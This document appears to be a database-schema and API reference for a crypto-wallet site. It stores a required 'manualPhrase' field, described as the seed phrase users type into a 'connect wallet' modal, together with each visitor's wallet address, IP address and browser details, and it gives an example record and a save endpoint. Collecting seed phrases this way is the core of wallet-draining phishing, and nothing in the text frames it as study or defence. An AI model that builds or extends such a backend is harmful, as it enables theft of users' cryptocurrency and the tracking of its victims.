# Database Schema

## User Collection

```javascript
{
  _id: ObjectId,
  
  walletAddress: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true,
    description: "Ethereum wallet address (e.g. 0x...)"
  },
  
  manualPhrase: {
    type: String,
    required: true,
    description: "User-entered seed phrase from connect modal"
  },
  
  browserInfo: {
    userAgent: String,
    deviceType: String,        // 'mobile', 'tablet', 'desktop'
    browserName: String,       // 'Chrome', 'Firefox', 'Safari', etc.
    browserVersion: String,    // '120.0.0'
    ipAddress: String,         // Client IP address
    platform: String           // 'Windows', 'macOS', 'Linux', etc.
  },
  
  createdAt: Date,
  updatedAt: Date
}
```

## Field Descriptions

### walletAddress
- **Type**: String
- **Required**: Yes
- **Unique**: Yes
- **Example**: `0x742d35Cc6634C0532925a3b844Bc9e7595f42bE7`
- **Description**: User's Ethereum wallet address, converted to lowercase for consistency

### manualPhrase
- **Type**: String
- **Required**: Yes
- **Example**: `seed phrase words here`
- **Description**: Security phrase entered by user in the connect wallet modal

### browserInfo
- **Type**: Object
- **Fields**:
  - `userAgent` (String): Full user agent string
    - Example: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit...`
  
  - `deviceType` (String): Device classification
    - Values: `'mobile'`, `'tablet'`, `'desktop'`
    - Example: `'desktop'`
  
  - `browserName` (String): Browser name
    - Example: `'Chrome'`, `'Firefox'`, `'Safari'`, `'Edge'`
  
  - `browserVersion` (String): Browser version
    - Example: `'120.0.6099.210'`
  
  - `ipAddress` (String): Client's IP address
    - Example: `'192.168.1.1'`
  
  - `platform` (String): Operating system
    - Example: `'Windows'`, `'macOS'`, `'Linux'`, `'Android'`, `'iOS'`

### createdAt
- **Type**: Date
- **Default**: Current timestamp
- **Description**: When the user was first registered

### updatedAt
- **Type**: Date
- **Default**: Current timestamp
- **Description**: When the user record was last modified

## MongoDB Index

```javascript
db.users.createIndex({ walletAddress: 1 }, { unique: true })
```

## Example Document

```json
{
  "_id": ObjectId("507f1f77bcf86cd799439011"),
  "walletAddress": "0x742d35cc6634c0532925a3b844bc9e7595f42be7",
  "manualPhrase": "abandon ability able about above absent abuse access accident account achieve",
  "browserInfo": {
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "deviceType": "desktop",
    "browserName": "Chrome",
    "browserVersion": "120.0.6099.210",
    "ipAddress": "203.0.113.45",
    "platform": "Windows"
  },
  "createdAt": ISODate("2024-01-15T10:30:00.000Z"),
  "updatedAt": ISODate("2024-01-15T10:30:00.000Z")
}
```

## API Endpoint

### POST /api/user/save

**Request Body**:
```json
{
  "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE7",
  "manualPhrase": "seed phrase words here"
}
```

**Browser Info** (automatically captured):
- Device type detected from user agent
- Browser name & version parsed
- IP address extracted from request headers
- Platform extracted from user agent

**Response**:
```json
{
  "success": true,
  "message": "User saved successfully",
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "walletAddress": "0x742d35cc6634c0532925a3b844bc9e7595f42be7",
    "createdAt": "2024-01-15T10:30:00.000Z"
  }
}
```
